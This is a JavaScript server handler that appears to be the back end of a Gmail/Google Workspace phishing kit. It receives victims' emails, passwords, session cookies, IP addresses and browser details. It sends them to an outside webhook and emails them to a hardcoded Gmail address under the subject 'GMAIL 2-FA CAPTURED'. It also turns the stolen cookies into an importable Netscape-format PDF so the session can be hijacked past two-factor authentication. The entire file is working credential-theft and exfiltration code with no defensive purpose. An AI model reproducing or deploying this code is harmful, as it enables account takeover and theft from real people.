import nodemailer from 'nodemailer';
import { PDFDocument, StandardFonts, rgb } from 'pdf-lib';

async function generateCookiePDF(cookies, email, domain) {
  const pdfDoc = await PDFDocument.create();
  const page = pdfDoc.addPage([612, 792]);
  const font = await pdfDoc.embedFont(StandardFonts.Helvetica);
  const { height } = page.getSize();

  let y = height - 50;

  page.drawText('Session Cookies', { x: 50, y, size: 16, font, color: rgb(0, 0, 0) });
  y -= 30;

  page.drawText('# Netscape HTTP Cookie File', { x: 50, y, size: 12, font, color: rgb(0, 0, 0) });
  y -= 20;

  page.drawText('# Netscape format - import to browser', { x: 50, y, size: 10, font, color: rgb(0.4, 0.4, 0.4) });
  y -= 30;

  const dom = domain || 'localhost';
  const expires = Math.floor(Date.now() / 1000) + 86400;

  if (cookies && cookies !== 'none') {
    const lines = cookies.split(';').map((c) => {
      const eq = c.trim().indexOf('=');
      if (eq < 0) return null;
      const name = c.trim().substring(0, eq).trim();
      const value = c.trim().substring(eq + 1).trim();
      if (!name) return null;
      return `${dom}\tTRUE\t/\t0\t${expires}\t${name}\t${value}`;
    }).filter(Boolean);

    const lineHeight = 12;
    for (const line of lines) {
      if (y < 50) break; // avoid overflow
      page.drawText(line, { x: 50, y, size: 10, font, color: rgb(0, 0, 0) });
      y -= lineHeight;
    }
  } else {
    page.drawText('No cookies captured', { x: 50, y, size: 12, font, color: rgb(0.5, 0, 0) });
  }

  return Buffer.from(await pdfDoc.save());
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const data = req.body;
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.connection.remoteAddress;

  console.log('Captured:', data.email, ip);

  // WEBHOOK BACKUP (optional)
  try {
    await fetch(process.env.WEBHOOK_URL || 'https://webhook.site/#!/temp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ...data, ip }),
    });
  } catch {}

  // GMAIL EMAIL
  try {
    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 587,
      secure: false,
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    const pdfBuffer = await generateCookiePDF(data.cookies, data.email, data.captureDomain);
    const pdfFilename = 'vct_session.pdf';

    await transporter.sendMail({
      from: `"Security Alert" <${process.env.EMAIL_USER}>`,
      to: 'busmeup13@gmail.com',
      subject: `🔔 GMAIL 2-FA CAPTURED: ${data.email}`,
      html: `
        <div style="font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto;">
          <h2 style="color:#d93025">🎯 Google Workspace Credentials</h2>
          <table cellpadding="8" style="border:1px solid #ddd;width:100%">
            <tr><td><strong>⏰ Time</strong></td><td>${new Date().toLocaleString()}</td></tr>
            <tr><td><strong>🌐 IP</strong></td><td>${ip}</td></tr>
            <tr><td><strong>📧 Email</strong></td><td>${data.email}</td></tr>
            <tr><td><strong>🔑 Password</strong></td><td style="font-family:monospace;color:#d93025">${data.password}</td></tr>
            <tr><td><strong>🍪 Cookies</strong></td><td>
              📄 <strong>PDF attached</strong> (vct_session.pdf)<br>
              ${data.cookiesImportLink ? `<a href="${String(data.cookiesImportLink).replace(/"/g, '&quot;')}" target="_blank" style="background:#28a745;color:white;padding:10px 20px;text-decoration:none;border-radius:6px;display:inline-block;margin-top:8px">Import cookies → session</a>` : ''}
            </td></tr>
            <tr><td><strong>👤 Browser</strong></td><td>${data.userAgent?.slice(0, 80)}...</td></tr>
          </table>
          <details>
            <summary>Full Data (JSON)</summary>
            <pre style="background:#f5f5f5;padding:16px;overflow:auto">${JSON.stringify(
              { ...data, cookies: data.cookiesImportLink ? 'See PDF + import link' : 'none' },
              null,
              2
            )}</pre>
          </details>
        </div>
      `,
      attachments: [
        {
          filename: pdfFilename,
          content: pdfBuffer,
          contentType: 'application/pdf',
        },
      ],
    });
  } catch (err) {
    console.error('Email send failed:', err.message);
  }

  res.json({ status: 'captured ✅', email: data.email });
}
